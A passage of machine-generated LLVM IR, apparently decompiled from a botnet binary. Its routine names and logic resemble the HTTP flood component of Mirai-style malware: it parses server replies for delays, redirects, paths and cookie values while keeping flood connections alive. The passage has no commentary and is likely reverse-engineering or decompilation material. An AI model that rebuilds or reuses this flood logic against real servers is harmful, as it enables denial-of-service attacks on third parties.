  %v1_ac20 = inttoptr i32 %v2_ac10 to i8*
  %v8_ac30 = call i32 @util_memsearch(i8* %v1_ac20, i32 %v2_ac1c, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0), i32 2)
  %v4_ac38 = inttoptr i32 %v8_ac30 to i8*
  %v7_ac40 = icmp eq i32 %v8_ac30, -1
  br i1 %v7_ac40, label %dec_label_pc_b1c8, label %dec_label_pc_ac48

dec_label_pc_ac48:                                ; preds = %dec_label_pc_abfc
  %v8_ac6c = icmp slt i8* %v4_ac38, inttoptr (i32 2 to i8*)
  br i1 %v8_ac6c, label %dec_label_pc_ac7c, label %dec_label_pc_ac70

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac48
  %v1_ac74 = add i32 %v8_ac30, -2
  %v4_ac78 = inttoptr i32 %v1_ac74 to i8*
  br label %dec_label_pc_ac7c

dec_label_pc_ac7c:                                ; preds = %dec_label_pc_ac48, %dec_label_pc_ac70
  %loc_ptr_-64.0 = phi i8* [ %v4_ac38, %dec_label_pc_ac48 ], [ %v4_ac78, %dec_label_pc_ac70 ]
  %v4_ac80 = ptrtoint i8* %loc_ptr_-64.0 to i32
  %v2_ac98 = add i32 %v2_ac10, %v4_ac80
  %v3_aca0 = inttoptr i32 %v2_ac98 to i8*
  store i8 0, i8* %v3_aca0, align 1
  %v1_aca8 = add i32 %v4_ac80, 1
  store i32 0, i32* %i_-216, align 4
  %v2_acfc54 = load i8, i8* %v1_ac20, align 1
  %v2_ad0056 = icmp eq i8 %v2_acfc54, 0
  br i1 %v2_ad0056, label %dec_label_pc_ad40, label %dec_label_pc_ad08

dec_label_pc_ace0:                                ; preds = %dec_label_pc_ad24
  %v1_ace4 = add i32 %v3_ace0, 1
  store i32 %v1_ace4, i32* %i_-216, align 4
  %v2_acf8 = add i32 %v1_ace4, %v2_ac10
  %v1_acfc = inttoptr i32 %v2_acf8 to i8*
  %v2_acfc = load i8, i8* %v1_acfc, align 1
  %v2_ad00 = icmp eq i8 %v2_acfc, 0
  br i1 %v2_ad00, label %dec_label_pc_ad40, label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_ac7c, %dec_label_pc_ace0
  %v3_ace0 = phi i32 [ %v1_ace4, %dec_label_pc_ace0 ], [ 0, %dec_label_pc_ac7c ]
  %v2_ad14 = add i32 %v3_ace0, %v2_ac10
  %v1_ad18 = inttoptr i32 %v2_ad14 to i8*
  %v2_ad18 = load i8, i8* %v1_ad18, align 1
  %tmp222 = icmp ult i8 %v2_ad18, 48
  br i1 %tmp222, label %dec_label_pc_ad40, label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %dec_label_pc_ad08
  %v2_ad34 = load i8, i8* %v1_ad18, align 1
  %tmp223 = icmp ult i8 %v2_ad34, 58
  br i1 %tmp223, label %dec_label_pc_ace0, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ace0, %dec_label_pc_ad08, %dec_label_pc_ad24, %dec_label_pc_ac7c
  %v3_ad64 = phi i32 [ 0, %dec_label_pc_ac7c ], [ %v1_ace4, %dec_label_pc_ace0 ], [ %v3_ace0, %dec_label_pc_ad08 ], [ %v3_ace0, %dec_label_pc_ad24 ]
  %v2_ad4c = add i32 %v3_ad64, %v2_ac10
  %v1_ad50 = inttoptr i32 %v2_ad4c to i8*
  %v2_ad50 = load i8, i8* %v1_ad50, align 1
  %v2_ad54 = icmp eq i8 %v2_ad50, 0
  br i1 %v2_ad54, label %dec_label_pc_b1c8, label %dec_label_pc_ad5c

dec_label_pc_ad5c:                                ; preds = %dec_label_pc_ad40
  store i8 0, i8* %v1_ad50, align 1
  %v3_ad7c = load i32, i32* %i_-216, align 4
  %v1_ad80 = add i32 %v3_ad7c, 1
  store i32 %v1_ad80, i32* %i_-216, align 4
  %v2_ad94 = add i32 %v1_ad80, %v2_ac10
  %v1_ad98 = inttoptr i32 %v2_ad94 to i8*
  %v2_ad98 = load i8, i8* %v1_ad98, align 1
  %v7_ad9c = icmp eq i8 %v2_ad98, 32
  br i1 %v7_ad9c, label %dec_label_pc_ada4, label %dec_label_pc_adb0

dec_label_pc_ada4:                                ; preds = %dec_label_pc_ad5c
  %v1_ada8 = add i32 %v3_ad7c, 2
  store i32 %v1_ada8, i32* %i_-216, align 4
  br label %dec_label_pc_adb0

dec_label_pc_adb0:                                ; preds = %dec_label_pc_ad5c, %dec_label_pc_ada4
  %v3_adb0 = phi i32 [ %v1_ad80, %dec_label_pc_ad5c ], [ %v1_ada8, %dec_label_pc_ada4 ]
  %v2_adbc = add i32 %v3_adb0, %v2_ac10
  store i32 %v2_adbc, i32* @r4, align 4
  %v1_add0 = inttoptr i32 %v2_adbc to i8*
  %v3_add4 = call i32 @util_strlen(i8* %v1_add0)
  %v0_addc = load i32, i32* @r4, align 4
  %v1_addc = inttoptr i32 %v0_addc to i8*
  %v7_ade8 = call i32 @util_stristr(i8* %v1_addc, i32 %v3_add4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e20.55, i32 0, i32 0))
  %v7_adf0 = icmp eq i32 %v7_ade8, -1
  %v3_ae44.pre = load i32, i32* %i_-216, align 4
  br i1 %v7_adf0, label %dec_label_pc_ae44, label %dec_label_pc_adf8

dec_label_pc_adf8:                                ; preds = %dec_label_pc_adb0
  %v2_ae04 = add i32 %v3_ae44.pre, %v2_ac10
  store i32 %v2_ae04, i32* @r4, align 4
  %v1_ae18 = inttoptr i32 %v2_ae04 to i8*
  %v3_ae1c = call i32 @util_strlen(i8* %v1_ae18)
  %v0_ae24 = load i32, i32* @r4, align 4
  %v1_ae24 = inttoptr i32 %v0_ae24 to i8*
  %v7_ae30 = call i32 @util_stristr(i8* %v1_ae24, i32 %v3_ae1c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e20.55, i32 0, i32 0))
  %v3_ae38 = load i32, i32* %i_-216, align 4
  %v2_ae3c = add i32 %v3_ae38, %v7_ae30
  store i32 %v2_ae3c, i32* %i_-216, align 4
  br label %dec_label_pc_ae44

dec_label_pc_ae44:                                ; preds = %dec_label_pc_adb0, %dec_label_pc_adf8
  %v3_ae60 = phi i32 [ %v2_ae3c, %dec_label_pc_adf8 ], [ %v3_ae44.pre, %dec_label_pc_adb0 ]
  %v2_ae50 = add i32 %v3_ae60, %v2_ac10
  %v1_ae54 = inttoptr i32 %v2_ae50 to i8*
  %v2_ae54 = load i8, i8* %v1_ae54, align 1
  %v7_ae58 = icmp eq i8 %v2_ae54, 34
  br i1 %v7_ae58, label %dec_label_pc_ae60, label %dec_label_pc_aee8

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae44
  %v1_ae64 = add i32 %v3_ae60, 1
  store i32 %v1_ae64, i32* %i_-216, align 4
  %v2_ae78 = add i32 %v1_ae64, %v2_ac10
  store i32 %v2_ae50, i32* @r4, align 4
  %v1_ae90 = inttoptr i32 %v2_ae78 to i8*
  %v3_ae94 = call i32 @util_strlen(i8* %v1_ae90)
  %v0_ae9c = load i32, i32* @r4, align 4
  %v2_ae9c = add i32 %v0_ae9c, %v3_ae94
  %v1_aea0 = inttoptr i32 %v2_ae9c to i8*
  %v2_aea0 = load i8, i8* %v1_aea0, align 1
  %v7_aea4 = icmp eq i8 %v2_aea0, 34
  br i1 %v7_aea4, label %dec_label_pc_aeac, label %dec_label_pc_aee8

dec_label_pc_aeac:                                ; preds = %dec_label_pc_ae60
  %v3_aeac = load i32, i32* %i_-216, align 4
  %v2_aeb8 = add i32 %v3_aeac, %v2_ac10
  %v1_aebc = add i32 %v2_aeb8, -1
  store i32 %v1_aebc, i32* @r4, align 4
  %v1_aed0 = inttoptr i32 %v2_aeb8 to i8*
  %v3_aed4 = call i32 @util_strlen(i8* %v1_aed0)
  %v0_aedc = load i32, i32* @r4, align 4
  %v2_aedc = add i32 %v0_aedc, %v3_aed4
  %v3_aee4 = inttoptr i32 %v2_aedc to i8*
  store i8 0, i8* %v3_aee4, align 1
  br label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_ae60, %dec_label_pc_ae44, %dec_label_pc_aeac
  %v4_aef0 = call i32 @util_atoi(i8* %v1_ac20, i32 10)
  %tmp169 = icmp slt i32 %v4_aef0, 1
  br i1 %tmp169, label %dec_label_pc_af40, label %dec_label_pc_af14.lr.ph

dec_label_pc_af14.lr.ph:                          ; preds = %dec_label_pc_aee8
  %v8_af1c = icmp sgt i32 %v4_aef0, 9
  %v2_af28 = add i32 %v4_aef0, %v2_9c60
  br i1 %v8_af1c, label %dec_label_pc_af40, label %dec_label_pc_af20

dec_label_pc_af00:                                ; preds = %dec_label_pc_af20
  %v1_af04 = call i32 @sleep(i32 1)
  br label %dec_label_pc_af20

dec_label_pc_af20:                                ; preds = %dec_label_pc_af14.lr.ph, %dec_label_pc_af00
  store i32 %v2_af28, i32* @r4, align 4
  %v2_af30 = call i32 @__GI_time(i32* null)
  %v0_af38 = load i32, i32* @r4, align 4
  %tmp224 = icmp ugt i32 %v0_af38, %v2_af30
  br i1 %tmp224, label %dec_label_pc_af00, label %dec_label_pc_af40

dec_label_pc_af40:                                ; preds = %dec_label_pc_af14.lr.ph, %dec_label_pc_af20, %dec_label_pc_aee8
  %v3_af40 = load i32, i32* %i_-216, align 4
  %v2_af4c = add i32 %v3_af40, %v2_ac10
  %v4_af54 = inttoptr i32 %v2_af4c to i8*
  %v3_af58 = call i32 @util_strlen(i8* %v4_af54)
  %v7_af6c = call i32 @util_stristr(i8* %v4_af54, i32 %v3_af58, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e18.53, i32 0, i32 0))
  %v7_af74 = icmp eq i32 %v7_af6c, 4
  br i1 %v7_af74, label %dec_label_pc_af7c, label %dec_label_pc_b104

dec_label_pc_af7c:                                ; preds = %dec_label_pc_af40
  store i32 7, i32* %i_-216, align 4
  %v1_af88 = add i32 %v2_af4c, 4
  %v1_af8c = inttoptr i32 %v1_af88 to i8*
  %v2_af8c = load i8, i8* %v1_af8c, align 1
  %v7_af90 = icmp eq i8 %v2_af8c, 115
  br i1 %v7_af90, label %dec_label_pc_af98, label %dec_label_pc_afa4

dec_label_pc_af98:                                ; preds = %dec_label_pc_af7c
  store i32 8, i32* %i_-216, align 4
  br label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %dec_label_pc_af7c, %dec_label_pc_af98
  %v3_afa4 = phi i32 [ 7, %dec_label_pc_af7c ], [ 8, %dec_label_pc_af98 ]
  %v2_afb0 = add i32 %v3_afa4, %v2_af4c
  store i32 %v2_afb0, i32* @r1, align 4
  %v2_afbc = sub i32 %v1_aca8, %v3_afa4
  store i32 %v2_afbc, i32* @r3, align 4
  store i32 %v2_af4c, i32* @r0, align 4
  store i32 %v2_afbc, i32* @r2, align 4
  %v3_afc8 = call i32 @memmove(i32 %v2_af4c, i32 %v2_afb0, i32 %v2_afbc)
  store i32 0, i32* %i_-216, align 4
  %v2_b02c59 = load i8, i8* %v4_af54, align 1
  %v2_b03061 = icmp eq i8 %v2_b02c59, 0
  br i1 %v2_b03061, label %dec_label_pc_b038, label %dec_label_pc_afd8

dec_label_pc_afd8:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_b010
  %v3_aff4 = phi i32 [ %v1_b014, %dec_label_pc_b010 ], [ 0, %dec_label_pc_afa4 ]
  %v2_afe4 = add i32 %v3_aff4, %v2_af4c
  %v1_afe8 = inttoptr i32 %v2_afe4 to i8*
  %v2_afe8 = load i8, i8* %v1_afe8, align 1
  %v7_afec = icmp eq i8 %v2_afe8, 47
  br i1 %v7_afec, label %dec_label_pc_aff4, label %dec_label_pc_b010

dec_label_pc_aff4:                                ; preds = %dec_label_pc_afd8
  store i8 0, i8* %v1_afe8, align 1
  br label %dec_label_pc_b038

dec_label_pc_b010:                                ; preds = %dec_label_pc_afd8
  %v1_b014 = add i32 %v3_aff4, 1
  store i32 %v1_b014, i32* %i_-216, align 4
  %v2_b028 = add i32 %v1_b014, %v2_af4c
  %v1_b02c = inttoptr i32 %v2_b028 to i8*
  %v2_b02c = load i8, i8* %v1_b02c, align 1
  %v2_b030 = icmp eq i8 %v2_b02c, 0
  br i1 %v2_b030, label %dec_label_pc_b038, label %dec_label_pc_afd8

dec_label_pc_b038:                                ; preds = %dec_label_pc_b010, %dec_label_pc_afa4, %dec_label_pc_aff4
  %v3_b03c = call i32 @util_strlen(i8* %v4_af54)
  %tmp170 = icmp slt i32 %v3_b03c, 1
  br i1 %tmp170, label %dec_label_pc_b078, label %dec_label_pc_b04c

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b038
  %v3_b050 = call i32 @util_strlen(i8* %v4_af54)
  %v8_b05c = icmp sgt i32 %v3_b050, 127
  br i1 %v8_b05c, label %dec_label_pc_b078, label %dec_label_pc_b060

dec_label_pc_b060:                                ; preds = %dec_label_pc_b04c
  %v1_b068 = add i32 %v2_9cb0, 789
  %v1_b06c = inttoptr i32 %v1_b068 to i8*
  %v6_b074 = call i32 @util_strcpy(i8* %v1_b06c, i8* %v4_af54)
  br label %dec_label_pc_b078

dec_label_pc_b078:                                ; preds = %dec_label_pc_b04c, %dec_label_pc_b038, %dec_label_pc_b060
  %v1_b07c = add i32 %v2_af4c, 1
  %v3_b080 = load i32, i32* %i_-216, align 4
  %v2_b084 = add i32 %v3_b080, %v1_b07c
  %v1_b088 = inttoptr i32 %v2_b084 to i8*
  %v3_b08c = call i32 @util_strlen(i8* %v1_b088)
  %v8_b098 = icmp sgt i32 %v3_b08c, 255
  br i1 %v8_b098, label %dec_label_pc_b19c, label %dec_label_pc_b09c

dec_label_pc_b09c:                                ; preds = %dec_label_pc_b078
  %v1_b0a4 = add i32 %v2_9cb0, 533
  %v1_b0a8 = inttoptr i32 %v1_b0a4 to i8*
  call void @util_zero(i8* %v1_b0a8, i32 255)
  %v3_b0bc = load i32, i32* %i_-216, align 4
  %v2_b0c0 = add i32 %v3_b0bc, %v1_b07c
  %v1_b0c4 = inttoptr i32 %v2_b0c0 to i8*
  %v3_b0c8 = call i32 @util_strlen(i8* %v1_b0c4)
  %tmp171 = icmp slt i32 %v3_b0c8, 1
  br i1 %tmp171, label %dec_label_pc_b19c, label %dec_label_pc_b0d8

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_b09c
  %v3_b0ec = load i32, i32* %i_-216, align 4
  %v2_b0f0 = add i32 %v3_b0ec, %v1_b07c
  %v1_b0f8 = inttoptr i32 %v2_b0f0 to i8*
  %v6_b0fc = call i32 @util_strcpy(i8* %v1_b0a8, i8* %v1_b0f8)
  br label %dec_label_pc_b19c

dec_label_pc_b104:                                ; preds = %dec_label_pc_af40
  %v2_b108 = load i8, i8* %v4_af54, align 1
  %v7_b10c = icmp eq i8 %v2_b108, 47
  br i1 %v7_b10c, label %dec_label_pc_b114, label %dec_label_pc_b19c

dec_label_pc_b114:                                ; preds = %dec_label_pc_b104
  %v1_b118 = add i32 %v2_af4c, 1
  %v3_b11c = load i32, i32* %i_-216, align 4
  %v2_b120 = add i32 %v3_b11c, %v1_b118
  %v1_b124 = inttoptr i32 %v2_b120 to i8*
  %v3_b128 = call i32 @util_strlen(i8* %v1_b124)
  %v8_b134 = icmp sgt i32 %v3_b128, 255
  br i1 %v8_b134, label %dec_label_pc_b19c, label %dec_label_pc_b138

dec_label_pc_b138:                                ; preds = %dec_label_pc_b114
  %v1_b140 = add i32 %v2_9cb0, 533
  %v1_b144 = inttoptr i32 %v1_b140 to i8*
  call void @util_zero(i8* %v1_b144, i32 255)
  %v3_b158 = load i32, i32* %i_-216, align 4
  %v2_b15c = add i32 %v3_b158, %v1_b118
  %v1_b160 = inttoptr i32 %v2_b15c to i8*
  %v3_b164 = call i32 @util_strlen(i8* %v1_b160)
  %tmp172 = icmp slt i32 %v3_b164, 1
  br i1 %tmp172, label %dec_label_pc_b19c, label %dec_label_pc_b174

dec_label_pc_b174:                                ; preds = %dec_label_pc_b138
  %v3_b188 = load i32, i32* %i_-216, align 4
  %v2_b18c = add i32 %v3_b188, %v1_b118
  %v1_b194 = inttoptr i32 %v2_b18c to i8*
  %v6_b198 = call i32 @util_strcpy(i8* %v1_b144, i8* %v1_b194)
  br label %dec_label_pc_b19c

dec_label_pc_b19c:                                ; preds = %dec_label_pc_b104, %dec_label_pc_b138, %dec_label_pc_b114, %dec_label_pc_b09c, %dec_label_pc_b078, %dec_label_pc_b0d8, %dec_label_pc_b174
  %v1_b1a4 = add i32 %v2_9cb0, 1431
  store i32 %v1_b1a4, i32* @r3, align 4
  store i32 %v1_b1a4, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22dc8.29 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_b1b4 = call i32 @memcpy()
  store i8 10, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba58

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad40, %dec_label_pc_abfc, %dec_label_pc_ab64
  %v8_b1e4 = call i32 @util_memsearch(i8* %v3_8428, i32 %v4_9e78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e0c.47, i32 0, i32 0), i32 4)
  %v1_b1f8 = add i32 %v2_9cb0, 1431
  %v1_b1fc = inttoptr i32 %v1_b1f8 to i8*
  %v6_b204 = call i8 @util_strcmp(i8* %v1_b1fc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22e28.58, i32 0, i32 0))
  %v2_b20c = icmp eq i8 %v6_b204, 0
  br i1 %v2_b20c, label %dec_label_pc_b214, label %dec_label_pc_b238

dec_label_pc_b214:                                ; preds = %dec_label_pc_b1c8
  %v6_b228 = call i8 @util_strcmp(i8* %v1_b1fc, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22dc8.29, i32 0, i32 0))
  %v2_b230 = icmp eq i8 %v6_b228, 0
  br i1 %v2_b230, label %dec_label_pc_b248, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b214
  store i8 7, i8* %v2_9e24, align 1
  br label %dec_label_pc_b274

dec_label_pc_b248:                                ; preds = %dec_label_pc_b214
  %v7_b254 = icmp sgt i32 %v4_9e78, %v8_b1e4
  br i1 %v7_b254, label %dec_label_pc_b258, label %dec_label_pc_b268

dec_label_pc_b258:                                ; preds = %dec_label_pc_b248
  store i8 10, i8* %v2_9e24, align 1
  br label %dec_label_pc_b274

dec_label_pc_b268:                                ; preds = %dec_label_pc_b248
  store i8 1, i8* %v2_9e24, align 1
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b258, %dec_label_pc_b238, %dec_label_pc_b268
  %v2_b278 = load i32, i32* %v1_9cbc, align 4
  %v4_b29c = call i32 @__libc_recv(i32 %v2_b278, i32 %v3_8410, i32 %v8_b1e4, i32 16384)
  br label %dec_label_pc_ba58

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_9e20
  %v3_b2b0 = load i8, i8* %v2_9e24, align 1
  %v7_b2b4 = icmp eq i8 %v3_b2b0, 7
  br i1 %v7_b2b4, label %dec_label_pc_b2bc.preheader, label %dec_label_pc_b968

dec_label_pc_b2bc.preheader:                      ; preds = %dec_label_pc_b2ac
  br i1 true, label %dec_label_pc_b2cc.lr.ph, label %dec_label_pc_ba58

dec_label_pc_b2cc.lr.ph:                          ; preds = %dec_label_pc_b2bc.preheader
  %v1_b2d0 = add i32 %v2_9cb0, 2112
  %v2_b2d0 = inttoptr i32 %v1_b2d0 to i32*
  %v1_b2e4 = add i32 %v2_9cb0, 2116
  %v1_b2f4 = add i32 %v2_9cb0, 2180
  %v2_b418 = add i32 %v2_9cb0, 8
  %v3_b418 = inttoptr i32 %v2_b418 to i32*
  %v1_b428 = add i32 %v2_9cb0, 1464
  %v2_b428 = inttoptr i32 %v1_b428 to i32*
  %v1_b750 = add i32 %v2_9cb0, 1460
  %v2_b750 = inttoptr i32 %v1_b750 to i32*
  %v1_b770 = inttoptr i32 %v1_b2e4 to i8*
  %v1_b470 = add i32 %v2_9cb0, 1452
  %v2_b470 = inttoptr i32 %v1_b470 to i32*
  %v1_b56c = add i32 %v2_9cb0, 1468
  %v2_b56c = inttoptr i32 %v1_b56c to i32*
  %v1_b5a4 = add i32 %v2_9cb0, 1472
  %v2_b7d0 = add i32 %v2_9cb0, 2114
  br label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %dec_label_pc_b2cc.lr.ph, %dec_label_pc_b2bc.backedge
  %v3_b2d0 = load i32, i32* %v2_b2d0, align 4
  %v7_b2d4 = icmp eq i32 %v3_b2d0, 1024
  br i1 %v7_b2d4, label %dec_label_pc_b2dc, label %dec_label_pc_b31c

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2cc
  store i32 %v1_b2f4, i32* @r3, align 4
  store i32 %v1_b2e4, i32* @r0, align 4
  store i32 %v1_b2f4, i32* @r1, align 4
  store i32 960, i32* @r2, align 4
  %v3_b304 = call i32 @memmove(i32 %v1_b2e4, i32 %v1_b2f4, i32 960)
  %v3_b30c = load i32, i32* %v2_b2d0, align 4
  %v1_b310 = add i32 %v3_b30c, -64
  store i32 %v1_b310, i32* %v2_b2d0, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b2cc, %dec_label_pc_b2dc
  %v0_b31c = call i32 @__GI___errno_location()
  %v2_b328 = inttoptr i32 %v0_b31c to i32*
  store i32 0, i32* %v2_b328, align 4
  %v2_b330 = load i32, i32* %v1_9cbc, align 4
  %v3_b344 = load i32, i32* %v2_b2d0, align 4
  %v2_b348 = add i32 %v3_b344, %v1_b2e4
  %v1_b354 = sub i32 1024, %v3_b344
  %v4_b368 = call i32 @__libc_recv(i32 %v2_b330, i32 %v2_b348, i32 %v1_b354, i32 16384)
  %v2_b378 = icmp eq i32 %v4_b368, 0
  br i1 %v2_b378, label %dec_label_pc_b380, label %dec_label_pc_b398

dec_label_pc_b380:                                ; preds = %dec_label_pc_b31c
  %v0_b380 = call i32 @__GI___errno_location()
  %v2_b38c = inttoptr i32 %v0_b380 to i32*
  store i32 104, i32* %v2_b38c, align 4
  br label %dec_label_pc_b398

dec_label_pc_b398:                                ; preds = %dec_label_pc_b31c, %dec_label_pc_b380
  %http_table_-204.0 = phi i32 [ -1, %dec_label_pc_b380 ], [ %v4_b368, %dec_label_pc_b31c ]
  %v3_b39c = icmp eq i32 %http_table_-204.0, -1
  br i1 %v3_b39c, label %dec_label_pc_b3a4, label %dec_label_pc_b3f8

dec_label_pc_b3a4:                                ; preds = %dec_label_pc_b398
  %v0_b3a4 = call i32 @__GI___errno_location()
  %v1_b3ac = inttoptr i32 %v0_b3a4 to i32*
  %v2_b3ac = load i32, i32* %v1_b3ac, align 4
  %v7_b3b0 = icmp eq i32 %v2_b3ac, 11
  br i1 %v7_b3b0, label %dec_label_pc_ba58, label %dec_label_pc_b3b8

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b3a4
  %v0_b3b8 = call i32 @__GI___errno_location()
  %v1_b3c0 = inttoptr i32 %v0_b3b8 to i32*
  %v2_b3c0 = load i32, i32* %v1_b3c0, align 4
  %v7_b3c4 = icmp eq i32 %v2_b3c0, 11
  br i1 %v7_b3c4, label %dec_label_pc_ba58, label %dec_label_pc_b3cc

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b3b8
  %v2_b3d0 = load i32, i32* %v1_9cbc, align 4
  %v1_b3d8 = call i32 @__GI___libc_close(i32 %v2_b3d0)
  store i32 -1, i32* %v1_9cbc, align 4
  store i8 0, i8* %v2_9e24, align 1
  br label %dec_label_pc_ba58

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b398
  %v3_b3fc = load i32, i32* %v2_b2d0, align 4
  %v2_b404 = add i32 %v3_b3fc, %http_table_-204.0
  store i32 %v2_b404, i32* %v2_b2d0, align 4
  store i32 %v2_9c60, i32* %v3_b418, align 4
  br label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b8e4, %dec_label_pc_b3f8
  %v3_b428 = load i32, i32* %v2_b428, align 4
  %tmp173 = icmp slt i32 %v3_b428, 1
  br i1 %tmp173, label %dec_label_pc_b73c, label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %dec_label_pc_b41c
  %v3_b438 = load i32, i32* %v2_b428, align 4
  %v3_b440 = load i32, i32* %v2_b2d0, align 4
  %v2_b444 = sub i32 %v3_b438, %v3_b440
  %v4_b444 = xor i32 %v3_b440, %v3_b438
  %v5_b444 = xor i32 %v2_b444, %v3_b438
  %v6_b444 = and i32 %v5_b444, %v4_b444
  %v7_b444 = icmp slt i32 %v6_b444, 0
  %v8_b444 = icmp slt i32 %v2_b444, 0
  %v2_b448 = xor i1 %v8_b444, %v7_b444
  br i1 %v2_b448, label %bb, label %bb174

bb:                                               ; preds = %dec_label_pc_b434
  br label %bb174

bb174:                                            ; preds = %dec_label_pc_b434, %bb
  %v0_b450 = phi i32 [ %v3_b440, %dec_label_pc_b434 ], [ %v3_b438, %bb ]
  %v3_b458 = load i32, i32* %v2_b428, align 4
  %v2_b460 = sub i32 %v3_b458, %v0_b450
  store i32 %v2_b460, i32* %v2_b428, align 4
  %v3_b470 = load i32, i32* %v2_b470, align 4
  %v7_b474 = icmp eq i32 %v3_b470, 1
  br i1 %v7_b474, label %dec_label_pc_b47c, label %dec_label_pc_b73c

dec_label_pc_b47c:                                ; preds = %bb174
  store i32 %v1_b2e4, i32* @r4, align 4
  %v3_b48c = load i32, i32* %v2_b2d0, align 4
  store i32 %v3_b48c, i32* @r5, align 4
  %v3_b498 = call i8* @table_retrieve_val(i32 36, i32* null)
  %v0_b4a0 = load i32, i32* @r4, align 4
  %v1_b4a0 = inttoptr i32 %v0_b4a0 to i8*
  %v0_b4a4 = load i32, i32* @r5, align 4
  %v8_b4b0 = call i32 @util_memsearch(i8* %v1_b4a0, i32 %v0_b4a4, i8* %v3_b498, i32 11)
  %v7_b4b8 = icmp eq i32 %v8_b4b0, -1
  br i1 %v7_b4b8, label %dec_label_pc_b73c, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b47c
  store i32 %v1_b2e4, i32* @r4, align 4
  %v3_b4d0 = load i32, i32* %v2_b2d0, align 4
  store i32 %v3_b4d0, i32* @r5, align 4
  %v3_b4dc = call i8* @table_retrieve_val(i32 36, i32* null)
  %v0_b4e4 = load i32, i32* @r4, align 4
  %v1_b4e4 = inttoptr i32 %v0_b4e4 to i8*
  %v0_b4e8 = load i32, i32* @r5, align 4
  %v8_b4f4 = call i32 @util_memsearch(i8* %v1_b4e4, i32 %v0_b4e8, i8* %v3_b4dc, i32 11)
  %v2_b510 = add i32 %v8_b4f4, %v1_b2e4
  %v3_b518 = load i32, i32* %v2_b2d0, align 4
  %v2_b520 = sub i32 %v3_b518, %v8_b4f4
  %v1_b524 = inttoptr i32 %v2_b510 to i8*
  %v9_b534 = call i32 @util_memsearch(i8* %v1_b524, i32 %v2_b520, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e30.60, i32 0, i32 0), i32 1)
  %v1_b544 = add i32 %v8_b4f4, -1
  %v2_b54c = add i32 %v1_b544, %v9_b534
  %v2_b558 = add i32 %v2_b54c, %v2_9cb0
  %v3_b564 = add i32 %v2_b558, 2116
  %v4_b564 = inttoptr i32 %v3_b564 to i8*
  store i8 0, i8* %v4_b564, align 1
  %v3_b56c = load i32, i32* %v2_b56c, align 4
  %v1_b570 = add i32 %v3_b56c, -4
  %v3_b570 = sub i32 3, %v3_b56c
  %v4_b570 = and i32 %v3_b570, %v3_b56c
  %v5_b570 = icmp slt i32 %v4_b570, 0
  %v6_b570 = icmp slt i32 %v1_b570, 0
  %v7_b570 = icmp eq i32 %v3_b56c, 4
  %v3_b574 = xor i1 %v6_b570, %v5_b570
  %v4_b574 = or i1 %v7_b570, %v3_b574
  br i1 %v4_b574, label %dec_label_pc_b578, label %dec_label_pc_b720

dec_label_pc_b578:                                ; preds = %dec_label_pc_b4c0
  %v3_b590 = call i32 @util_strlen(i8* %v1_b524)
  %v8_b59c = icmp sgt i32 %v3_b590, 127
  br i1 %v8_b59c, label %dec_label_pc_b720, label %dec_label_pc_b5a0

dec_label_pc_b5a0:                                ; preds = %dec_label_pc_b578
  %v3_b5ac = load i32, i32* %v2_b56c, align 4
  %v3_b5b0 = mul i32 %v3_b5ac, 128
  %v2_b5b4 = add i32 %v3_b5b0, %v1_b5a4
  %v1_b5d0 = inttoptr i32 %v2_b5b4 to i8*
  %v6_b5d8 = call i32 @util_strcpy(i8* %v1_b5d0, i8* %v1_b524)
  %v3_b5e8 = load i32, i32* %v2_b56c, align 4
  %v3_b5ec = mul i32 %v3_b5e8, 128
  %v2_b5f0 = add i32 %v3_b5ec, %v1_b5a4
  store i32 %v2_b5f0, i32* %r4.global-to-local, align 4
  %v3_b604 = load i32, i32* %v2_b56c, align 4
  %v3_b608 = mul i32 %v3_b604, 128
  %v2_b60c = add i32 %v3_b608, %v1_b5a4
  %v1_b610 = inttoptr i32 %v2_b60c to i8*
  %v3_b614 = call i32 @util_strlen(i8* %v1_b610)
  %v0_b61c = load i32, i32* %r4.global-to-local, align 4
  %v2_b61c = add i32 %v0_b61c, %v3_b614
  %v1_b620 = inttoptr i32 %v2_b61c to i8*
  %v6_b628 = call i32 @util_strcpy(i8* %v1_b620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e34.62, i32 0, i32 0))
  %v1_b630 = add i32 %v8_b4f4, 3
  %v2_b638 = add i32 %v1_b630, %v9_b534
  %v2_b650 = add i32 %v2_b638, %v1_b2e4
